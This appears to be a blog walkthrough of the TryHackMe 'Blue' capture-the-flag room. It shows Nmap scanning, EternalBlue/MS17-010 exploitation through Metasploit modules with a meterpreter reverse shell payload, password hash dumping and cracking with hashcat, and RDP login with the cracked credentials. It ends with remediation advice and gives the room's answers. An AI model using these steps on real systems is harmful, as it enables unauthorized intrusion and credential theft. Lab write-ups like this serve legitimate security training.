# Blue TryHackMe 

## Room1 : Recon

*   as always i will start by doing recon and lets see what is going to be the weakest point and easy way to get inside the server using ***Nmap.***
    

for today i am using zenmap:

![](https://cdn.hashnode.com/uploads/covers/6a77779d4416d3eea9accad0/0537962f-8ece-499b-82b2-1a4808ec2e19.png align="center")

we can see there are multiple ports open and some services under them .(lets do the questions and i will get back to this .)

```shell
1, How many ports are open with a port number under 1000?
  # ok to scan this i use namp -p 1000 <ip> in that case the answer is "3"
2, What is this machine vulnerable to? (Answer in the form of: ms??-???, ex: ms08-067)
#for this question i need to do some research so follow up:
so first i need to check the devices so when i did that i found there was a problem for microsoft-ds currently running on port 445 on the server so lets dig in ,in that case i can nmap to see if microsoft-ds is vulnerable or not an also can find what is the machine vulnerable for.... after all that i found that the device got a problem called ms17-010.
```

![](https://cdn.hashnode.com/uploads/covers/6a77779d4416d3eea9accad0/4a626378-599e-45a0-9d7b-65c5f1ef30ba.png align="center")

*   in this room i have to find out how to use that vulnerablity to my advantage so it can help for the next room(gain access).
    

so lets continue the research a little more . lets type ms17\_010 to any search engine and find what is the specific about it.

![](https://cdn.hashnode.com/uploads/covers/6a77779d4416d3eea9accad0/2fa89bcb-3e39-4285-bba3-de84bbe13d13.png align="center")

lets search the CVE for more info

![](https://cdn.hashnode.com/uploads/covers/6a77779d4416d3eea9accad0/dcb798f5-c038-4ab5-a1a7-6f9355be78f1.png align="center")

after all the research i can continue to the next room with info i got doing recon

## room2 : gain access

in this room i am going to use a tool called `Metasploit`

what is Metasploit?

*   Metasploit Framework is a modular exploitation/penetration-testing platform — essentially a giant library of pre-built attack code plus the infrastructure to deliver and manage it. Structure:
    
*   **Exploits** (`exploit/`)  
    Code that leverages a specific vulnerability to gain execution .
    
*   **Auxiliary** (`auxiliary/`)  
    Everything that isn't "get a shell" — scanners, fuzzers, DoS modules, login brute-forcers, protocol probes.
    
*   **Payloads** (`payload/`)  
    The actual code that runs *after* successful exploitation — what gets delivered.
    

if i say this much about metasploit i can start working with it.. so lets start metasploit on owr terminal .

```shell
1, Find the exploitation code we will run against the machine. What is the full path of the code? (Ex: exploit/........)
#answer - exploit/windows/smb/ms17_010_eternalblue
2, Show options and set the one required value. What is the name of this value? (All caps for submission)
#answer - RHOSTS (this is for the ip for the server )
```

![](https://cdn.hashnode.com/uploads/covers/6a77779d4416d3eea9accad0/223d43bc-1060-4a49-9ecb-ebd7e562aff6.png align="center")

lets start by searching the exploit code for ms17\_010. as u can see on the above pic i start by searching for eternalblue and lets see if i can find a matching code for ms17\_010.

![](https://cdn.hashnode.com/uploads/covers/6a77779d4416d3eea9accad0/89093021-e84f-4493-94ed-63d5536c0bc4.png align="center")

as you see i found 2 exploit commands so we are good to go and also i did get an auxiliary commands to so i can check if the target has weakness before attacking .

![](https://cdn.hashnode.com/uploads/covers/6a77779d4416d3eea9accad0/56a27a44-691d-4c67-a821-b252473c7dc1.png align="center")

based on my search the host is likely vulnerable so i can continue exploiting .

## room 3 Esclate:

> `forward from this i will be doing the questions in the way!`

```shell
1, If you haven't already, background the previously gained shell (CTRL + Z). Research online how to convert a shell to meterpreter shell in metasploit. What is the name of the post module we will use? (Exact path, similar to the exploit we previously selected) 
#answer - post/multi/manage/shell_to_meterpreter
2, Select this (use MODULE_PATH). Show options, what option are we required to change?
# answer - session
```

to exploit the target i need to confirm if the session is on other wise i am still not there yet.

but before all that let me show you how to set up the metasploit for the attack

```shell
use exploit(windows/smb/ms17_010_eternalblue
set RHOSTS <target ip>
set LHOSTS <users id>
exploit/run
then if we want the payload we can add by (set)
set payload windows/x64/meterpreter/reverse_tcp
show options (to see what u can do)
```

lets check if i can get a session using :

`use exploit(windows/smb/ms17_010_eternalblue` ... first i will add a payload too it and i will try.

![](https://cdn.hashnode.com/uploads/covers/6a77779d4416d3eea9accad0/5239ee26-d4df-44ed-8d60-ab860196c450.png align="center")

even after trying it multiple times i can not get sessions so i have to try the other exploit command and try to get session:

`use exploit(windows/smb/ms17_010_psexec`

lets add a payload to it

![](https://cdn.hashnode.com/uploads/covers/6a77779d4416d3eea9accad0/ee3a88ac-be0d-4bde-b086-8790e09118a5.png align="center")

![](https://cdn.hashnode.com/uploads/covers/6a77779d4416d3eea9accad0/7da6c23e-c270-4c6a-9844-62333147da87.png align="center")

in this case with ease i get access.

## room 4: Cracking

*   i am in the server so lets see what i can do . using the command help i can see what commands i can use.
    

![](https://cdn.hashnode.com/uploads/covers/6a77779d4416d3eea9accad0/d58a43f0-8cbc-4b73-a664-f675798d9a99.png align="center")

while in here let me do the questions

```shell
1, Within our elevated meterpreter shell, run the command 'hashdump'. This will dump all of the passwords on the machine as long as we have the correct privileges to do so. What is the name of the non-default user? 
#answer - jon
2, Copy this password hash to a file and research how to crack it. What is the cracked password?
#answer - alqfna22
```

<mark class="bg-yellow-200 dark:bg-yellow-500/30">how ?</mark>

*   i use hashdump on the meterpreter directly to find the users and thier password on hash form .
    
    ![](https://cdn.hashnode.com/uploads/covers/6a77779d4416d3eea9accad0/a7449d34-1424-44bd-bcd3-0daaf0fc6bd3.png align="center")
    
    *   so to find the password i will use a tool called "hashcat"
        
    *   in my case i only need the NT\_hash .
        
        ```shell
        username : RID : LM_hash(string) : NT_hash(md4 hash) ::: 
        ```
        
*   as displayed on the out put i can see who is the non default user is "jon"
    

so for "hashcat" to work i need a wordlist for that case i am using "rockyou".

![](https://cdn.hashnode.com/uploads/covers/6a77779d4416d3eea9accad0/9d7fe38c-cf55-4c71-8542-fd8b12c6f237.png align="center")

and let the tool do the job

![](https://cdn.hashnode.com/uploads/covers/6a77779d4416d3eea9accad0/5dde2a90-4389-42c1-992f-5d62106ce3ea.png align="center")

*   finally i found the password of jon and its "alqfna22"
    

## room 5 : Find flags!

*   after all i am in the server but i have to find the flags to finish this room so lets navigate to the shell and see what i an do.
    

![](https://cdn.hashnode.com/uploads/covers/6a77779d4416d3eea9accad0/765d2274-f505-46f6-8f37-6bba5b8f2645.png align="center")

*   ```shell
    Flag1? This flag can be found at the system root. 
    ```
    

to find this flag i need to know to be on the system root and list files to see if its in there:

![](https://cdn.hashnode.com/uploads/covers/6a77779d4416d3eea9accad0/9b1de10a-4960-4604-8b6c-a44a617614ff.png align="center")

there is the file so lets open it and copy the flag

![](https://cdn.hashnode.com/uploads/covers/6a77779d4416d3eea9accad0/c59954c2-96e2-4ac3-86a5-27d2337e43f3.png align="center")

*   lets move on to the second flag
    

```shell
Flag2? This flag can be found at the location where passwords are stored within Windows.
```

i got the hint so let go there : so passwordsare stored within windows inside this path `C:\Windows\System32\config`

my jop it to navigate there and copy the flag:

![](https://cdn.hashnode.com/uploads/covers/6a77779d4416d3eea9accad0/a9fa1501-2f34-424f-93fb-f1b00f15a16e.png align="center")

*   lets move on to the 3rd flag :
    

```shell
flag3? This flag can be found in an excellent location to loot. After all, Administrators usually have pretty interesting things saved. 
```

for this one i was looking every where inside the administrators files but finally i find it inside `\Users\Jon\Documents>`

![](https://cdn.hashnode.com/uploads/covers/6a77779d4416d3eea9accad0/01b42535-e17a-4070-baee-10f042a493dc.png align="center")

and i am done , but if doing all this inside terminal is hard we can do it in better and clear way after finding the password and user :

to do that i install a tool called `freerdp` after installing it .

❯ `xfreerdp3 /u:Jon /p:'alqfna22' /v:10.80.130.156` i use this command to connect to the server so the command will automatically open GUI version of itself to access the server:

![](https://cdn.hashnode.com/uploads/covers/6a77779d4416d3eea9accad0/0fc065ea-6f4c-41b1-b11e-96d3b0241c89.png align="left")

![](https://cdn.hashnode.com/uploads/covers/6a77779d4416d3eea9accad0/575b6be3-343a-4c8c-9606-51c2c83b3d62.png align="center")

![](https://cdn.hashnode.com/uploads/covers/6a77779d4416d3eea9accad0/d7e1c4a0-3689-4207-90a5-d014e1cfce8c.png align="center")

***Thank you for reading!***

## Expanded technical workflow

### 1. Target and service discovery

Start the assigned Blue machine, obtain its current IP address, and verify that the lab is reachable. Run an initial scan and save the result:

```bash
nmap -sC -sV -oN blue-initial.txt TARGET_IP
```

`-sC` runs Nmap's default scripts, `-sV` probes discovered ports for service/version information, and `-oN` writes a readable report. A Windows SMB service may be exposed on TCP 445 or NetBIOS-related ports, but use the scan output from the current instance rather than assuming a fixed port state.

### 2. Enumerate SMB safely

If SMB is exposed, identify the SMB dialect and whether the host appears to be vulnerable to the issue described in the room. A targeted Nmap script scan may be appropriate in the authorized lab:

```bash
nmap -p 139,445 --script smb-protocols,smb-os-discovery TARGET_IP
```

The `-p` option limits the scan to the listed ports; the scripts report protocol and operating-system hints. Script results are evidence to investigate, not a guarantee of exploitability.

### 3. Map the vulnerability to the evidence

The classic Blue room focuses on the Windows SMB vulnerability associated with MS17-010. Confirm that the room's target and service match the vulnerable configuration before selecting a proof of concept. Search only trusted advisories and module documentation. Do not use an exploit just because a version string looks old.

### 4. Validate initial access in the lab

Follow the room's documented exploitation task and verify the result from the session itself. Record the module or tool used, required target options, session result, and effective identity. If a session is not established, do not claim successful exploitation; review reachability, target configuration, architecture, and options.

### 5. Post-exploitation and flags

After access, use the lab's intended steps to identify the requested user or administrator flag locations. Verify the current user and privilege level before assuming that administrator access has been obtained. Avoid searching or copying unrelated files, and redact actual flags as `flag{hidden}` in public notes.

### 6. Remediation

Apply the relevant Microsoft security update, disable SMBv1 where it is not needed, restrict SMB at network boundaries, remove unnecessary exposure of TCP 445, and monitor suspicious SMB activity. Legacy systems require a documented risk decision and compensating controls if they cannot be patched.

### 7. Reproducibility

Record Nmap output, tool versions, the vulnerability check, the exact authorized lab procedure, and the observed session identity. Room IP addresses and service states can change between deployments, so the active lab is the source of truth.
